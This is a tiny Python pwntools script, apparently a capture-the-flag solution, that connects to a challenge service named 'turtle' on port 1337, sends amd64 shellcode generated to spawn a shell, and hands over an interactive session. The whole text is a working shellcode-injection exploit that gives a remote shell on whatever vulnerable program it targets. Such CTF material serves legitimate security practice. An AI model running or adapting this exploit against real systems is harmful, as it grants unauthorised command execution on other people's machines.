from pwn import *

# p = process('./turtle')
p = remote('turtle.sdc.tf', 1337)
context.arch = 'amd64'

shellcode = asm(shellcraft.sh())

p.sendline(shellcode)
p.interactive()
